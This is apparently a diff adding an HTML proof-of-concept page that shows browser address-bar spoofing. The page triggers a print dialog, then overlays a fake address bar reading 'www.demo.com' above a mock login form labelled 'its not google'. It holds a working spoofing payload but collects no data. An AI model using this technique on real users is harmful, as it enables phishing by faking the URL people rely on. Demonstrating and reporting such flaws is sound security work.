@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>www.demo.com</title>
+
+<meta name="theme-color" content="#f1f3f4" id="theme-color-meta">
+
+<button
+  id="printLink"
+  style="font-size:20px; cursor:pointer;"
+  onclick="window.open('/poc.html', '_blank')">
+  www.demo.com 
+</button>
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  font-family: system-ui, Arial, sans-serif;
+  background: #000;
+  color: #e8eaed;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  border-top: 1px solid #111;
+}
+
+/* Demo watermark */
+.demo {
+  position: fixed;
+  top: 6px;
+  right: 10px;
+  font-size: 11px;
+  color: #f28b82;
+  z-index: 10000;
+  opacity: .8;
+}
+
+/* Layout */
+.container {
+  flex: 1;
+  padding: 72px 24px 32px; /* extra top padding for fake bar */
+}
+
+h1 {
+  font-size: 28px;
+  font-weight: 400;
+  margin-bottom: 8px;
+}
+
+.subtitle {
+  color: #bdc1c6;
+  margin-bottom: 32px;
+}
+
+input {
+  width: 100%;
+  padding: 18px 16px;
+  font-size: 16px;
+  background: transparent;
+  color: #e8eaed;
+  border: 2px solid #8ab4f8;
+  border-radius: 4px;
+  outline: none;
+}
+
+input::placeholder {
+  color: #8ab4f8;
+}
+
+.actions {
+  margin-top: 32px;
+  display: flex;
+  justify-content: flex-end;
+}
+
+button {
+  background: #8ab4f8;
+  color: #000;
+  border: none;
+  border-radius: 999px;
+  padding: 10px 20px;
+  font-size: 14px;
+}
+
+/* Fake address bar (TOP) */
+.fake-bar {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  height: 44px;
+  background: #121212;
+  border-bottom: 1px solid #303134;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: monospace;
+  font-size: 14px;
+  color: #e8eaed;
+  z-index: 9999;
+
+  opacity: 0;
+  visibility: hidden;
+  transform: translateY(-100%);
+  transition:
+    opacity .25s ease,
+    visibility .25s ease,
+    transform .3s ease;
+}
+
+.fake-bar.show {
+  opacity: 1;
+  visibility: visible;
+  transform: translateY(0);
+}
+</style>
+</head>
+
+<body>
+
+
+<div class="fake-bar" id="fakeBar">www.demo.com</div>
+
+<div class="container">
+  <h1>Masuk</h1>
+  <div class="subtitle">its not google</div>
+
+  <input id="myInput" type="text" placeholder="Click here">
+
+  <div class="actions">
+    <button onclick="window.print()">Login</button>
+  </div>
+</div>
+
+<script>
+const input = document.getElementById("myInput");
+const fakeBar = document.getElementById("fakeBar");
+const metaTheme = document.getElementById("theme-color-meta");
+
+function changeTabColor(color) {
+  metaTheme.setAttribute("content", color);
+}
+
+/* 1️⃣ Fokus input → keyboard muncul → trigger print */
+document.getElementById("printLink").addEventListener("click", function () {
+    // Delay 3 seconds before printing
+    setTimeout(() => {
+        window.print();
+    }, 1000);
+});
+
+/* 2️⃣ Print dialog ditutup → tampilkan fake address bar */
+window.addEventListener("afterprint", () => {
+  setTimeout(() => {
+    fakeBar.classList.add("show");
+  }, 300);
+});
+
+/* 3️⃣ Blur → reset */
+input.addEventListener("blur", () => {
+  fakeBar.classList.remove("show");
+  changeTabColor("#f1f3f4");
+});
+</script>
+
+</body>
+</html>
